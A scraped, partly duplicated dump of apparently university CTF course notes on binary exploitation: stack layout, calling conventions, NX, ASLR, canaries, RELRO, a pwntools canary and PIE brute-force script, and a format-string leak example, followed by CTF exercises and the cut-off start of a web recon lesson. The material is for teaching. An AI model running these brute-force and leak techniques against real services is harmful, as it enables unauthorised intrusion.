0xffff002c 0xffff0004: 0xffffa0a0 // say_hi argument 1 ESP -> 0xffff0000: 0x0804845a // Return address for say_hi And finally, ret pops the saved instruction pointer into eip which causes the program to return to main with the same esp , ebp , and stack contents as when say_hi was initially called. EIP = 0x0804845a (add esp, 0x10) ESP = 0xffff0000 EBP = 0xffff002c ESP -> 0xffff0004: 0xffffa0a0 // say_hi argument 1 Calling Conventions To be able to call functions, there needs to be an agreed-upon way to pass arguments. If a program is entirely self-contained in a binary, the compiler would be free to decide the calling convention. However in reality, shared libraries are used so that common code (e.g. libc) can be stored once and dynamically linked in to programs that need it, reducing program size. In Linux binaries, there are really only two commonly used calling conventions: cdecl for 32-bit binaries, and SysV for 64-bit cdecl In 32-bit binaries on Linux, function arguments are passed in on the stack in reverse order. A function like this: int add(int a, int b, int c) { return a + b + c; } would be invoked by pushing c , then b , then a . SysV For 64-bit binaries, function arguments are first passed in certain registers: RDI RSI RDX RCX R8 R9 then any leftover arguments are pushed onto the stack in reverse order, as in cdecl. Other Conventions Any method of passing arguments could be used as long as the compiler is aware of what the convention is. As a result, there have been many calling conventions in the past that aren't used frequently anymore. See Wikipedia for a comprehensive list. Binary Security Binary Security is using tools and methods in order to secure programs from being manipulated and exploited. This tools are not infallible, but when used together and implemented properly, they can raise the difficulty of exploitation greatly. No eXecute (NX Bit) The No eXecute or the NX bit (also known as Data Execution Prevention or DEP) marks certain areas of the program as not executable, meaning that stored input or data cannot be executed as code. This is significant because it prevents attackers from being able to jump to custom shellcode that they've stored on the stack or in a global variable. Checking for NX You can either use pwntools' checksec or rabin2 . $ checksec vuln [*] 'vuln' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments $ rabin2 -I vuln [...] nx false [...] Address Space Layout Randomization (ASLR) Address Space Layout Randomization (or ASLR) is the randomization of the place in memory where the program, shared libraries, the stack, and the heap are. This makes can make it harder for an attacker to exploit a service, as knowledge about where the stack, heap, or libc can't be re-used between program launches. This is a partially effective way of preventing an attacker from jumping to, for example, libc without a leak. Typically, only the stack, heap, and shared libraries are ASLR enabled. It is still somewhat rare for the main program to have ASLR enabled, though it is being seen more frequently and is slowly becoming the default. Stack Canaries Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately. Bypassing Stack Canaries Stack Canaries seem like a clear cut way to mitigate any stack smashing as it is fairly impossible to just guess a random 64-bit value. However, leaking the address and bruteforcing the canary are two methods which would allow us to get through the canary check. Stack Canary Leaking If we can read the data in the stack canary, we can send it back to the program later because the canary stays the same throughout execution. However Linux makes this slightly tricky by making the first byte of the stack canary a NULL, meaning that string functions will stop when they hit it. A method around this would be to partially overwrite and then put the NULL back or find a way to leak bytes at an arbitrary stack offset. A few situations where you might be able to leak a canary: User-controlled format string User-controlled length of an output \u201cHey, can you send me 1000000 bytes? thx!\u201d Bruteforcing a Stack Canary The canary is determined when the program starts up for the first time which means that if the program forks, it keeps the same stack cookie in the child process. This means that if the input that can overwrite the canary is sent to the child, we can use whether it crashes as an oracle and brute-force 1 byte at a time! This method can be used on fork-and-accept servers where connections are spun off to child processes, but only under certain conditions such as when the input accepted by the program does not append a NULL byte ( read or recv ). Buffer (N Bytes) ?? ?? ?? ?? ?? ?? ?? ?? RBP RIP Fill the buffer N Bytes + 0x00 results in no crash Buffer (N Bytes) 00 ?? ?? ?? ?? ?? ?? ?? RBP RIP Fill the buffer N Bytes + 0x00 + 0x00 results in a crash N Bytes + 0x00 + 0x01 results in a crash N Bytes + 0x00 + 0x02 results in a crash ... N Bytes + 0x00 + 0x51 results in no crash Buffer (N Bytes) 00 51 ?? ?? ?? ?? ?? ?? RBP RIP Repeat this bruteforcing process for 6 more bytes... Buffer (N Bytes) 00 51 FE 0A 31 D2 7B 3C RBP RIP Now that we have the stack cookie, we can overwrite the RIP register and take control of the program! Relocation Read-Only (RELRO) Relocation Read-Only (or RELRO) is a security measure which makes some binary sections read-only. There are two RELRO \"modes\": partial and full. Partial RELRO Partial RELRO is the default setting in GCC, and nearly all binaries you will see have at least partial RELRO. From an attackers point-of-view, partial RELRO makes almost no difference, other than it forces the GOT to come before the BSS in memory, eliminating the risk of a buffer overflows on a global variable overwriting GOT entries. Full RELRO Full RELRO makes the entire GOT read-only which removes the ability to perform a \"GOT overwrite\" attack, where the GOT address of a function is overwritten with the location of another function or a ROP gadget an attacker wants to run. Full RELRO is not a default compiler setting as it can greatly increase program startup time since all symbols must be resolved before the program is started. In large programs with thousands of symbols that need to be linked, this could cause a noticable delay in startup time. Bypassing Canary & PIE If you are facing a binary protected by a canary and PIE (Position Independent Executable) you probably need to find a way to bypass them. Canary The best way to bypass a simple canary is if the binary is a program forking child processes every time you establish a new connection with it (network service), because every time you connect to it the same canary will be used . Then, the best way to bypass the canary is just to brute-force it char by char , and you can figure out if the guessed canary byte was correct checking if the program has crashed or continues its regular flow. In this example the function brute-forces an 8 Bytes canary (x64) and distinguish between a correct guessed byte and a bad byte just checking if a response is sent back by the server (another way in other situation could be using a try/except ): from pwn import * def connect(): r = remote(\"localhost\", 8788) def get_bf(base): canary = \"\" guess = 0x0 base += canary while len(canary) < 8: while guess != 0xff: r = connect() r.recvuntil(\"Username: \") r.send(base + chr(guess)) if \"SOME OUTPUT\" in r.clean(): print \"Guessed correct byte:\", format(guess, '02x') canary += chr(guess) base += chr(guess) guess = 0x0 r.close() break else: guess += 1 r.close() print \"FOUND:\\\\x\" + '\\\\x'.join(\"{:02x}\".format(ord(c)) for c in canary) return base canary_offset = 1176 base = \"A\" * canary_offset print(\"Brute-Forcing canary\") base_canary = get_bf(base) #Get yunk data + canary CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary PIE In order to bypass the PIE you need to leak some address . And if the binary is not leaking any addresses the best to do it is to brute-force the RBP and RIP saved in the stack in the vulnerable function. For example, if a binary is protected using both a canary and PIE , you can start brute-forcing the canary, then the next 8 Bytes (x64) will be the saved RBP and the next 8 Bytes will be the saved RIP. To brute-force the RBP and the RIP from the binary you can figure out that a valid guessed byte is correct if the program output something or it just doesn't crash. The same function as the provided for brute-forcing the canary can be used to brute-force the RBP and the RIP: print(\"Brute-Forcing RBP\") base_canary_rbp = get_bf(base_canary) RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:]) print(\"Brute-Forcing RIP\") base_canary_rbp_rip = get_bf(base_canary_rbp) RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:]) Get base address The last thing you need to defeat the PIE is to calculate useful addresses from the leaked addresses: the RBP and the RIP . From the RBP you can calculate where are you writing your shell in the stack . This can be very useful to know where are you going to write the string \"/bin/sh\\x00\" inside the stack. To calculate the distance between the leaked RBP and your shellcode you can just put a breakpoint after leaking the RBP an check where is your shellcode located , then, you can calculate the distance between the shellcode and the RBP: INI_SHELLCODE = RBP - 1152 From the RIP you can calculate the base address of the PIE binary which is what you are going to need to create a valid ROP chain . To calculate the base address just do objdump -d vunbinary and check the disassemble latest addresses: In that example you can see that only 1 Byte and a half is needed to locate all the code, then, the base address in this situation will be the leaked RIP but finishing on \"000\" . For example if you leaked 0x562002970 ecf the base address is 0x562002970**000 elf.address = RIP - (RIP & 0xfff) Format String Vulnerability A format string vulnerability is a bug where user input is passed as the format argument to printf , scanf , or another function in that family. The format argument has many different specifies which could allow an attacker to leak data if they control the format argument to printf . Since printf and similar are variadic functions, they will continue popping data off of the stack according to the format. For example, if we can make the format argument \"%x.%x.%x.%x\", printf will pop off four stack values and print them in hexadecimal, potentially leaking sensitive information. printf can also index to an arbitrary \"argument\" with the following syntax: \"%n$x\" (where n is the decimal index of the argument you want). While these bugs are powerful, they're very rare nowadays, as all modern compilers warn when printf is called with a non-constant string. Example #include <stdio.h> #include <unistd.h> int main() { int secret_num = 0x8badf00d; char name[64] = {0}; read(0, name, 64); printf(\"Hello \"); printf(name); printf(\"! You'll never get my secret!\\n\"); return 0; } Due to how GCC decided to lay out the stack, secret_num is actually at a lower address on the stack than name , so we only have to go to the 7th \"argument\" in printf to leak the secret: $ ./fmt_string %7$llx Hello 8badf00d3ea43eef ! You'll never get my secret! Exercise (5 pt) \"Gimme the report.\" The Boss said CS315 course is open, and this year we added some CTF challenges to the lab tutorial. After 3 weeks of teaching, our professor wants some feedback from students. \"Design a service, please. Gather some feedback and report from students of CS315.\" \"Sure.\" Answered in no time, but I got super nervous because of me, as a computer science graduate, don't know how to programming. By the way, I already got some report said that why this course so easy , please tell something hard . Fine, I'll just write my program that reads from user input, but stores nothing. No store, no vulnerability. Yeah, I'm going to save my job! my_super_secret_report_service my_super_secret_report_service.c nc ali.infury.org 10004 (5 pt) My Last Chance It's super hard to convince my Boss that report system is just broken temporarily. Now I'm going to learn programming and security very hard to save my job. ---- 2 DAYS LATER ---- Totally didn't learn. \"Some students want to enroll this course, please make something to collect enroll.\" \"But, but this course is full already...\" \"CS315 is hard, someone gonna to quit. So, in case anyone want to enroll, we need to handle this.\" The Boss looked at me, \"can't you programming?\" \"Yep! Yeah, seriously I can programming very well!\" I need to prepare my CV now. awesome_enroll_service awesome_enroll_service.c nc ali.infury.org 10005 Please use netcat to connect and solve challenges! And don't ask why there isn't a flag.txt in source code... (BONUS 5 pt) Me, worked in maid cafes Yet another programming order from cafes. So called maid cafes, their Boss wants me to design a service to collect costumers' requirements. The Boss promised me if I can finish such a program, I can come to the cafes free forever. So stuck in the flavor of coffee (not the maid I promise) that I swear gonna to get this work done. Very strange I don't understand the details of this program (like how big, how far, which requirements are they?), and why some CS315 students are pentesting my program. Luckily I learned about some security parameters already, so I simply turned them on. maid ld-linux-x86-64.so.2 libc.so.6 This is a ROP challenge and you may find it's difficult. But success solvers will win a badge.","title":"Week3 PWN: Advanced Buffer Overflow"},{"location":"CS315/Week%203/#week3-pwn-advanced-buffer-overflow","text":"","title":"Week3 PWN: Advanced Buffer Overflow"},{"location":"CS315/Week%203/#binary-exploitation","text":"Binaries, or executables, are machine code for a computer to execute. For the most part, the binaries that you will face in CTFs are Linux ELF files or the occasional windows executable. Binary Exploitation is a broad topic within Cyber Security which really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program's functions. Common topics addressed by Binary Exploitation or 'pwn' challenges include: Registers The Stack Calling Conventions Global Offset Table (GOT) Buffers Buffer Overflow Return Oriented Programming (ROP) Binary Security No eXecute (NX) Address Space Layout Randomization (ASLR) Stack Canaries Relocation Read-Only (RELRO) The Heap Heap Exploitation Format String Vulnerability","title":"Binary Exploitation"},{"location":"CS315/Week%203/#the-stack","text":"In computer architecture, the stack is a hardware manifestation of the stack data structure (a Last In, First Out queue). In x86, the stack is simply an area in RAM that was chosen to be the stack - there is no special hardware to store stack contents. The esp / rsp register holds the address in memory where the bottom of the stack resides. When something is push ed to the stack, esp decrements by 4 (or 8 on 64-bit x86), and the value that was push ed is stored at that location in memory. Likewise, when a pop instruction is executed, the value at esp is retrieved (i.e. esp is dereferenced), and esp is then incremented by 4 (or 8). N.B. The stack \"grows\" down to lower memory addresses! Conventionally, ebp / rbp contains the address of the top of the current stack frame , and so sometimes local variables are referenced as an offset relative to ebp rather than an offset to esp . A stack frame is essentially just the space used on the stack by a given function.","title":"The Stack"},{"location":"CS315/Week%203/#uses","text":"The stack is primarily used for a few things: Storing function arguments Storing local variables Storing processor state between function calls","title":"Uses"},{"location":"CS315/Week%203/#example","text":"Let's see what the stack looks like right after say_hi has been called in this 32-bit x86 C program: #include <stdio.h> void say_hi(const char * name) { printf(\"Hello %s!\\n\", name); } int main(int argc, char ** argv) { char * name; if (argc != 2) { return 1; } name = argv[1]; say_hi(name); return 0; } And the relevant assembly: 0804840b <say_hi>: 804840b: 55 push ebp 804840c: 89 e5 mov ebp,esp 804840e: 83 ec 08 sub esp,0x8 8048411: 83 ec 08 sub esp,0x8 8048414: ff 75 08 push DWORD PTR [ebp+0x8] 8048417: 68 f0 84 04 08 push 0x80484f0 804841c: e8 bf fe ff ff call 80482e0 <printf@plt> 8048421: 83 c4 10 add esp,0x10 8048424: 90 nop 8048425: c9 leave 8048426: c3 ret 08048427 <main>: 8048427: 8d 4c 24 04 lea ecx,[esp+0x4] 804842b: 83 e4 f0 and esp,0xfffffff0 804842e: ff 71 fc push DWORD PTR [ecx-0x4] 8048431: 55 push ebp 8048432: 89 e5 mov ebp,esp 8048434: 51 push ecx 8048435: 83 ec 14 sub esp,0x14 8048438: 89 c8 mov eax,ecx 804843a: 83 38 02 cmp DWORD PTR [eax],0x2 804843d: 74 07 je 8048446 <main+0x1f> 804843f: b8 01 00 00 00 mov eax,0x1 8048444: eb 1c jmp 8048462 <main+0x3b> 8048446: 8b 40 04 mov eax,DWORD PTR [eax+0x4] 8048449: 8b 40 04 mov eax,DWORD PTR [eax+0x4] 804844c: 89 45 f4 mov DWORD PTR [ebp-0xc],eax 804844f: 83 ec 0c sub esp,0xc 8048452: ff 75 f4 push DWORD PTR [ebp-0xc] 8048455: e8 b1 ff ff ff call 804840b <say_hi> 804845a: 83 c4 10 add esp,0x10 804845d: b8 00 00 00 00 mov eax,0x0 8048462: 8b 4d fc mov ecx,DWORD PTR [ebp-0x4] 8048465: c9 leave 8048466: 8d 61 fc lea esp,[ecx-0x4] 8048469: c3 ret Skipping over the bulk of main , you'll see that at 0x8048452 main 's name local is pushed to the stack because it's the first argument to say_hi . Then, a call instruction is executed. call instructions first push the current instruction pointer to the stack, then jump to their destination. So when the processor begins executing say_hi at 0x0804840b , the stack looks like this: EIP = 0x0804840b (push ebp) ESP = 0xffff0000 EBP = 0xffff002c 0xffff0004: 0xffffa0a0 // say_hi argument 1 ESP -> 0xffff0000: 0x0804845a // Return address for say_hi The first thing say_hi does is save the current ebp so that when it returns, ebp is back where main expects it to be. The stack now looks like this: EIP = 0x0804840c (mov ebp, esp) ESP = 0xfffefffc EBP = 0xffff002c 0xffff0004: 0xffffa0a0 // say_hi argument 1 0xffff0000: 0x0804845a // Return address for say_hi ESP -> 0xfffefffc: 0xffff002c // Saved EBP Again, note how esp gets smaller when values are pushed to the stack. Next, the current esp is saved into ebp , marking the top of the new stack frame. EIP = 0x0804840e (sub esp, 0x8) ESP = 0xfffefffc EBP = 0xfffefffc 0xffff0004: 0xffffa0a0 // say_hi argument 1 0xffff0000: 0x0804845a // Return address for say_hi ESP, EBP -> 0xfffefffc: 0xffff002c // Saved EBP Then, the stack is \"grown\" to accommodate local variables inside say_hi . EIP = 0x08048414 (push [ebp + 0x8]) ESP = 0xfffeffec EBP = 0xfffefffc 0xffff0004: 0xffffa0a0 // say_hi argument 1 0xffff0000: 0x0804845a // Return address for say_hi EBP -> 0xfffefffc: 0xffff002c // Saved EBP 0xfffefff8: UNDEFINED 0xfffefff4: UNDEFINED 0xfffefff0: UNDEFINED ESP -> 0xfffefffc: UNDEFINED NOTE: stack space is not implictly cleared! Now, the 2 arguments to printf are pushed in reverse order. EIP = 0x0804841c (call printf@plt) ESP = 0xfffeffe4 EBP = 0xfffefffc 0xffff0004: 0xffffa0a0 // say_hi argument 1 0xffff0000: 0x0804845a // Return address for say_hi EBP -> 0xfffefffc: 0xffff002c // Saved EBP 0xfffefff8: UNDEFINED 0xfffefff4: UNDEFINED 0xfffefff0: UNDEFINED 0xfffeffec: UNDEFINED 0xfffeffe8: 0xffffa0a0 // printf argument 2 ESP -> 0xfffeffe4: 0x080484f0 // printf argument 1 Finally, printf is called, which pushes the address of the next instruction to execute. EIP = 0x080482e0 ESP = 0xfffeffe4 EBP = 0xfffefffc 0xffff0004: 0xffffa0a0 // say_hi argument 1 0xffff0000: 0x0804845a // Return address for say_hi EBP -> 0xfffefffc: 0xffff002c // Saved EBP 0xfffefff8: UNDEFINED 0xfffefff4: UNDEFINED 0xfffefff0: UNDEFINED 0xfffeffec: UNDEFINED 0xfffeffe8: 0xffffa0a0 // printf argument 2 0xfffeffe4: 0x080484f0 // printf argument 1 ESP -> 0xfffeffe0: 0x08048421 // Return address for printf Once printf has returned, the leave instruction moves ebp into esp , and pops the saved EBP. EIP = 0x08048426 (ret) ESP = 0xfffefffc EBP = 0xffff002c 0xffff0004: 0xffffa0a0 // say_hi argument 1 ESP -> 0xffff0000: 0x0804845a // Return address for say_hi And finally, ret pops the saved instruction pointer into eip which causes the program to return to main with the same esp , ebp , and stack contents as when say_hi was initially called. EIP = 0x0804845a (add esp, 0x10) ESP = 0xffff0000 EBP = 0xffff002c ESP -> 0xffff0004: 0xffffa0a0 // say_hi argument 1","title":"Example"},{"location":"CS315/Week%203/#calling-conventions","text":"To be able to call functions, there needs to be an agreed-upon way to pass arguments. If a program is entirely self-contained in a binary, the compiler would be free to decide the calling convention. However in reality, shared libraries are used so that common code (e.g. libc) can be stored once and dynamically linked in to programs that need it, reducing program size. In Linux binaries, there are really only two commonly used calling conventions: cdecl for 32-bit binaries, and SysV for 64-bit","title":"Calling Conventions"},{"location":"CS315/Week%203/#cdecl","text":"In 32-bit binaries on Linux, function arguments are passed in on the stack in reverse order. A function like this: int add(int a, int b, int c) { return a + b + c; } would be invoked by pushing c , then b , then a .","title":"cdecl"},{"location":"CS315/Week%203/#sysv","text":"For 64-bit binaries, function arguments are first passed in certain registers: RDI RSI RDX RCX R8 R9 then any leftover arguments are pushed onto the stack in reverse order, as in cdecl.","title":"SysV"},{"location":"CS315/Week%203/#other-conventions","text":"Any method of passing arguments could be used as long as the compiler is aware of what the convention is. As a result, there have been many calling conventions in the past that aren't used frequently anymore. See Wikipedia for a comprehensive list.","title":"Other Conventions"},{"location":"CS315/Week%203/#binary-security","text":"Binary Security is using tools and methods in order to secure programs from being manipulated and exploited. This tools are not infallible, but when used together and implemented properly, they can raise the difficulty of exploitation greatly.","title":"Binary Security"},{"location":"CS315/Week%203/#no-execute-nx-bit","text":"The No eXecute or the NX bit (also known as Data Execution Prevention or DEP) marks certain areas of the program as not executable, meaning that stored input or data cannot be executed as code. This is significant because it prevents attackers from being able to jump to custom shellcode that they've stored on the stack or in a global variable.","title":"No eXecute (NX Bit)"},{"location":"CS315/Week%203/#checking-for-nx","text":"You can either use pwntools' checksec or rabin2 . $ checksec vuln [*] 'vuln' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments $ rabin2 -I vuln [...] nx false [...]","title":"Checking for NX"},{"location":"CS315/Week%203/#address-space-layout-randomization-aslr","text":"Address Space Layout Randomization (or ASLR) is the randomization of the place in memory where the program, shared libraries, the stack, and the heap are. This makes can make it harder for an attacker to exploit a service, as knowledge about where the stack, heap, or libc can't be re-used between program launches. This is a partially effective way of preventing an attacker from jumping to, for example, libc without a leak. Typically, only the stack, heap, and shared libraries are ASLR enabled. It is still somewhat rare for the main program to have ASLR enabled, though it is being seen more frequently and is slowly becoming the default.","title":"Address Space Layout Randomization (ASLR)"},{"location":"CS315/Week%203/#stack-canaries","text":"Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately.","title":"Stack Canaries"},{"location":"CS315/Week%203/#bypassing-stack-canaries","text":"Stack Canaries seem like a clear cut way to mitigate any stack smashing as it is fairly impossible to just guess a random 64-bit value. However, leaking the address and bruteforcing the canary are two methods which would allow us to get through the canary check.","title":"Bypassing Stack Canaries"},{"location":"CS315/Week%203/#stack-canary-leaking","text":"If we can read the data in the stack canary, we can send it back to the program later because the canary stays the same throughout execution. However Linux makes this slightly tricky by making the first byte of the stack canary a NULL, meaning that string functions will stop when they hit it. A method around this would be to partially overwrite and then put the NULL back or find a way to leak bytes at an arbitrary stack offset. A few situations where you might be able to leak a canary: User-controlled format string User-controlled length of an output \u201cHey, can you send me 1000000 bytes? thx!\u201d","title":"Stack Canary Leaking"},{"location":"CS315/Week%203/#bruteforcing-a-stack-canary","text":"The canary is determined when the program starts up for the first time which means that if the program forks, it keeps the same stack cookie in the child process. This means that if the input that can overwrite the canary is sent to the child, we can use whether it crashes as an oracle and brute-force 1 byte at a time! This method can be used on fork-and-accept servers where connections are spun off to child processes, but only under certain conditions such as when the input accepted by the program does not append a NULL byte ( read or recv ). Buffer (N Bytes) ?? ?? ?? ?? ?? ?? ?? ?? RBP RIP Fill the buffer N Bytes + 0x00 results in no crash Buffer (N Bytes) 00 ?? ?? ?? ?? ?? ?? ?? RBP RIP Fill the buffer N Bytes + 0x00 + 0x00 results in a crash N Bytes + 0x00 + 0x01 results in a crash N Bytes + 0x00 + 0x02 results in a crash ... N Bytes + 0x00 + 0x51 results in no crash Buffer (N Bytes) 00 51 ?? ?? ?? ?? ?? ?? RBP RIP Repeat this bruteforcing process for 6 more bytes... Buffer (N Bytes) 00 51 FE 0A 31 D2 7B 3C RBP RIP Now that we have the stack cookie, we can overwrite the RIP register and take control of the program!","title":"Bruteforcing a Stack Canary"},{"location":"CS315/Week%203/#relocation-read-only-relro","text":"Relocation Read-Only (or RELRO) is a security measure which makes some binary sections read-only. There are two RELRO \"modes\": partial and full.","title":"Relocation Read-Only (RELRO)"},{"location":"CS315/Week%203/#partial-relro","text":"Partial RELRO is the default setting in GCC, and nearly all binaries you will see have at least partial RELRO. From an attackers point-of-view, partial RELRO makes almost no difference, other than it forces the GOT to come before the BSS in memory, eliminating the risk of a buffer overflows on a global variable overwriting GOT entries.","title":"Partial RELRO"},{"location":"CS315/Week%203/#full-relro","text":"Full RELRO makes the entire GOT read-only which removes the ability to perform a \"GOT overwrite\" attack, where the GOT address of a function is overwritten with the location of another function or a ROP gadget an attacker wants to run. Full RELRO is not a default compiler setting as it can greatly increase program startup time since all symbols must be resolved before the program is started. In large programs with thousands of symbols that need to be linked, this could cause a noticable delay in startup time.","title":"Full RELRO"},{"location":"CS315/Week%203/#bypassing-canary-pie","text":"If you are facing a binary protected by a canary and PIE (Position Independent Executable) you probably need to find a way to bypass them.","title":"Bypassing Canary &amp; PIE"},{"location":"CS315/Week%203/#canary","text":"The best way to bypass a simple canary is if the binary is a program forking child processes every time you establish a new connection with it (network service), because every time you connect to it the same canary will be used . Then, the best way to bypass the canary is just to brute-force it char by char , and you can figure out if the guessed canary byte was correct checking if the program has crashed or continues its regular flow. In this example the function brute-forces an 8 Bytes canary (x64) and distinguish between a correct guessed byte and a bad byte just checking if a response is sent back by the server (another way in other situation could be using a try/except ): from pwn import * def connect(): r = remote(\"localhost\", 8788) def get_bf(base): canary = \"\" guess = 0x0 base += canary while len(canary) < 8: while guess != 0xff: r = connect() r.recvuntil(\"Username: \") r.send(base + chr(guess)) if \"SOME OUTPUT\" in r.clean(): print \"Guessed correct byte:\", format(guess, '02x') canary += chr(guess) base += chr(guess) guess = 0x0 r.close() break else: guess += 1 r.close() print \"FOUND:\\\\x\" + '\\\\x'.join(\"{:02x}\".format(ord(c)) for c in canary) return base canary_offset = 1176 base = \"A\" * canary_offset print(\"Brute-Forcing canary\") base_canary = get_bf(base) #Get yunk data + canary CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary","title":"Canary"},{"location":"CS315/Week%203/#pie","text":"In order to bypass the PIE you need to leak some address . And if the binary is not leaking any addresses the best to do it is to brute-force the RBP and RIP saved in the stack in the vulnerable function. For example, if a binary is protected using both a canary and PIE , you can start brute-forcing the canary, then the next 8 Bytes (x64) will be the saved RBP and the next 8 Bytes will be the saved RIP. To brute-force the RBP and the RIP from the binary you can figure out that a valid guessed byte is correct if the program output something or it just doesn't crash. The same function as the provided for brute-forcing the canary can be used to brute-force the RBP and the RIP: print(\"Brute-Forcing RBP\") base_canary_rbp = get_bf(base_canary) RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:]) print(\"Brute-Forcing RIP\") base_canary_rbp_rip = get_bf(base_canary_rbp) RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])","title":"PIE"},{"location":"CS315/Week%203/#get-base-address","text":"The last thing you need to defeat the PIE is to calculate useful addresses from the leaked addresses: the RBP and the RIP . From the RBP you can calculate where are you writing your shell in the stack . This can be very useful to know where are you going to write the string \"/bin/sh\\x00\" inside the stack. To calculate the distance between the leaked RBP and your shellcode you can just put a breakpoint after leaking the RBP an check where is your shellcode located , then, you can calculate the distance between the shellcode and the RBP: INI_SHELLCODE = RBP - 1152 From the RIP you can calculate the base address of the PIE binary which is what you are going to need to create a valid ROP chain . To calculate the base address just do objdump -d vunbinary and check the disassemble latest addresses: In that example you can see that only 1 Byte and a half is needed to locate all the code, then, the base address in this situation will be the leaked RIP but finishing on \"000\" . For example if you leaked 0x562002970 ecf the base address is 0x562002970**000 elf.address = RIP - (RIP & 0xfff)","title":"Get base address"},{"location":"CS315/Week%203/#format-string-vulnerability","text":"A format string vulnerability is a bug where user input is passed as the format argument to printf , scanf , or another function in that family. The format argument has many different specifies which could allow an attacker to leak data if they control the format argument to printf . Since printf and similar are variadic functions, they will continue popping data off of the stack according to the format. For example, if we can make the format argument \"%x.%x.%x.%x\", printf will pop off four stack values and print them in hexadecimal, potentially leaking sensitive information. printf can also index to an arbitrary \"argument\" with the following syntax: \"%n$x\" (where n is the decimal index of the argument you want). While these bugs are powerful, they're very rare nowadays, as all modern compilers warn when printf is called with a non-constant string.","title":"Format String Vulnerability"},{"location":"CS315/Week%203/#example_1","text":"#include <stdio.h> #include <unistd.h> int main() { int secret_num = 0x8badf00d; char name[64] = {0}; read(0, name, 64); printf(\"Hello \"); printf(name); printf(\"! You'll never get my secret!\\n\"); return 0; } Due to how GCC decided to lay out the stack, secret_num is actually at a lower address on the stack than name , so we only have to go to the 7th \"argument\" in printf to leak the secret: $ ./fmt_string %7$llx Hello 8badf00d3ea43eef ! You'll never get my secret!","title":"Example"},{"location":"CS315/Week%203/#exercise","text":"","title":"Exercise"},{"location":"CS315/Week%203/#5-pt-gimme-the-report-the-boss-said","text":"CS315 course is open, and this year we added some CTF challenges to the lab tutorial. After 3 weeks of teaching, our professor wants some feedback from students. \"Design a service, please. Gather some feedback and report from students of CS315.\" \"Sure.\" Answered in no time, but I got super nervous because of me, as a computer science graduate, don't know how to programming. By the way, I already got some report said that why this course so easy , please tell something hard . Fine, I'll just write my program that reads from user input, but stores nothing. No store, no vulnerability. Yeah, I'm going to save my job! my_super_secret_report_service my_super_secret_report_service.c nc ali.infury.org 10004","title":"(5 pt) \"Gimme the report.\" The Boss said"},{"location":"CS315/Week%203/#5-pt-my-last-chance","text":"It's super hard to convince my Boss that report system is just broken temporarily. Now I'm going to learn programming and security very hard to save my job. ---- 2 DAYS LATER ---- Totally didn't learn. \"Some students want to enroll this course, please make something to collect enroll.\" \"But, but this course is full already...\" \"CS315 is hard, someone gonna to quit. So, in case anyone want to enroll, we need to handle this.\" The Boss looked at me, \"can't you programming?\" \"Yep! Yeah, seriously I can programming very well!\" I need to prepare my CV now. awesome_enroll_service awesome_enroll_service.c nc ali.infury.org 10005 Please use netcat to connect and solve challenges! And don't ask why there isn't a flag.txt in source code...","title":"(5 pt) My Last Chance"},{"location":"CS315/Week%203/#bonus-5-pt-me-worked-in-maid-cafes","text":"Yet another programming order from cafes. So called maid cafes, their Boss wants me to design a service to collect costumers' requirements. The Boss promised me if I can finish such a program, I can come to the cafes free forever. So stuck in the flavor of coffee (not the maid I promise) that I swear gonna to get this work done. Very strange I don't understand the details of this program (like how big, how far, which requirements are they?), and why some CS315 students are pentesting my program. Luckily I learned about some security parameters already, so I simply turned them on. maid ld-linux-x86-64.so.2 libc.so.6 This is a ROP challenge and you may find it's difficult. But success solvers will win a badge.","title":"(BONUS 5 pt) Me, worked in maid cafes"},{"location":"CS315/Week%204/","text":"Week4 WEB: Information Discovery Information Discovery So once you have decided on a target you want to start your recon-process. The recon-phase is usually divided up into two phases. Passive information gathering / OSINT This is when you check out stuff like: Web information Email Harvesting Whois enumeration Active information gathering This is when you start scanning the target with your different tools. Passive information gathering It is passive in the meaning that it doesn't directly send packets to the service. But in any other sense of the word there is nothing passive about this phase. Visit the website Okay, I guess this actually sends packets to the target, but whatever. Visit the page, look around, read about the target. What do they do? Whois Find out who is behind the website. Resolve the DNS host website.com nslookup website.com The the IP address and check it with whois whois 192.168.1.101 Netcraft Most of the info found on netcraft is not unique. It is basic whois info. But one thing is really good, it lists the different IP-addresses the page has had over the years. This can be a good way to bypass cloudflare and other services that hide the real IP. Using netcraft we can find the IP that was in use before they implemented cloudflare. Another detail that is good to know is the hosting-company or domain-provider . Those details can be used if we want to try some social-engineering or spear-phishing attack . Netcraft Find Subdomains Finding subdomains is fundamental. The more subdomains you find, the bigger attack surface you have. Which means bigger possibility of success. For now this seems to be a very comprehensive list of tools to find subdomains. https://blog.bugcrowd.com/discovering-subdomains DNS Basics This is the best article I have found about how the DNS-system works. Form the highest to the lowest level. An introduction to dns-terminology components and concepts Before we begin to look at the specific techniques that exists to find subdomains, lets try to understand what subdomains are and how they work. A - records A stands for address . The A record maps a name to one or more IP addresses, when the IP are known and stable. So that would be 123.244.223.222 => example.com AAAA - points to a IPv6 Record CNAME The CNAME record connects a name to another name. An example of that would be: www.example.com,CNAME,www.example.com.cdn.cloudflare.net. Another example is. If you have the domains mail.example.com and webmail.example.com. You can have webmail.example.com point to mail.example.com. So anyone visiting webmail.example.com will see the same thing as mail.example.com. It will NOT redirect you. Just show you the same content. Another typical usage of CNAME is to link www.example.com to example.com CNAME is quite convenient. Because if you change the A-record. The IP-address, you don't need to change the other subdomains, like ftp.example.com or www.example.com. Since they both point to example.com, which is a A-record and points directly to the IP. Another note. If foo.example.com points to bar.example.com, that mean that bar.example.com is the CNAME (Canonical/real/actual Name) of foo.example.com. Alias Kind of like CNAME in that it points to another name, not an IP. MX - Mail exchange https://en.wikipedia.org/wiki/MX_record Find Subdomains Finding subdomains is fundamental. The more subdomains you find, the bigger attack surface you have. Which means bigger possibility of success. For now 